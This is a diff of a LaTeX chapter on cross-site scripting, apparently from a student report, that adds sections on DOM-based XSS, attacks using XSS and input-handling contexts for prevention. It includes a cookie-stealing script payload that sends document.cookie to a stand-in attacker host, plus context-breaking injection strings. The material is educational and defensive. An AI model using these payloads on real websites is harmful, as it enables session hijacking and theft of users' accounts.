@@ -21,8 +21,61 @@ The attacker needs to craft a malicious URL with js in it as a parameter. This i
 
 \subsubsection{DOM-based XSS}
 DOM-based attacks can be a variant of the attacks mentioned earlier, with a subtle but important difference. The malicious js is inserted in the DOM by the js of the web application itself, and not by the server. This means that the front-end of the web app is also vulnerable to this kinds of exploits. This also means that the malicious js can come from other sources that are not visible to the server, like local storage, Indexed DB and in a URL's fragment identifier. Another thing to mind is that the malicious js can be executed later, and not always when the page is loaded.	
+% TODO: figure explaining DOM-based XSS
+
+
+\subsection{Attacks using XSS}
+Once the attacker finds a vulnerability has several ways to exploit it. Knowing the diverse ways a XSS can be used is useful to prevent it.
+
+\subsubsection{Session hijacking attack}
+The goal of this attack is to steal the session cookies to impersonate the user. A payload like this can send the cookies to a remote server controlled by the attacker passing the cookies as a parameter.
+
+\verb|<script>document.InnerHTML += "<img src='http://attackersite.com/?cookie="+ document.cookie + "/'>" </script>|
+
+This attack can be easily countered by setting the session cookies with the flag HTTPOnly, that we explained earlier in the cookies chapter.
+
+\subsubsection{Phishing attack}
+This attack overwrites the HTML of the website to trick the user into sending login credentials to the attacker. For example the payload can modify a form to submit the contents to a malicious server, or even modify the current page to make it look like the login page.
+
+\subsubsection{Others}
+JavaScript can interact with a lot of parts of the browser, and this makes XSS exploits very powerful. The attacker imagination is the limit but we can name a few more ways to exploit a XSS.
+\begin{itemize}
+	\item Redirect the victim to another URL.
+	\item Modify the page with fake information.
+	\item Recollect user information.
+	\item Find browser version to send a targeted exploit.
+\end{itemize}
 
 \subsection{XSS Prevention}
-\subsection{Attacks using XSS}
-% https://labs.detectify.com/2012/11/07/how-to-exploit-an-xss/
+Before explaining the actual prevention methods, it's important to know the factors that affect how each vulnerability is protected.
+\begin{itemize}
+	\item \textbf{Context:} Secure input handling needs to be performed differently depending on where in a page the user input is inserted.
+	\item \textbf{Inbound/outbound:} Secure input handling can be performed either when your website receives the input (inbound) or right before your website inserts the input into a page (outbound).
+	\item \textbf{Back-end/Front-end:} Most XSS protections are done in the back-end, but it's important to remember that DOM-based XSS happens exclusively in the front-end.
+\end{itemize}
+
+\subsubsection{Input handling contexts}
+In every web application there are many places where malicious js can be inserted. It's important to know how each context works, as the attacker wants to find a way of breaking it.
+
+\begin{table}[]
+	\centering
+	\caption{Inpuy contexts in a web application}
+	\label{my-label}
+	\begin{tabular}{|l|l|}
+		\hline
+		\multicolumn{1}{|c|}{\textbf{Context}} & \multicolumn{1}{c|}{\textbf{Example code}}                         \\ \hline
+	%	HTML element content                   & \textless{}div\textgreater{}userInput\textless{}/div\textgreater{} \\ \hline
+		HTML element content                   & \textless{}div\textgreater{}userInput\textless{}/div\textgreater{} \\ \hline
+		HTML attribute value                   & \textless{}input value="userInput"\textgreater{}                   \\ \hline
+		URL query value                        & http://example.com/?parameter=userInput                            \\ \hline
+		CSS value                              & color: userInput                                                   \\ \hline
+		JavaScript value                       & var name = "userInput";                                            \\ \hline
+	\end{tabular}
+\end{table}
+
+For example, if we had a HTML element input  and we want to break context, we could insert something like \verb|</div><script>...</script><div>| so the resulting HTML would be valid (\verb|<div></div><script>...</script><div></div>|). The closing division tag lets us insert whatever we want inside, so the obvious thing to do in order to protect the input would be to ban them. In another case \verb|<input value="userInput">|, that would not work because the browser will parse everything that gets between quotes as a text. In this case, the approach to attacking is closing the value field, and then insert the payload (\verb|"><script>...</script><input value="|).
+
+There are two fundamental ways to prevent XSS in an web app. These are not mutually exclusive and both have to be used to achieve maximum security
+\subsubsection{}
+
 
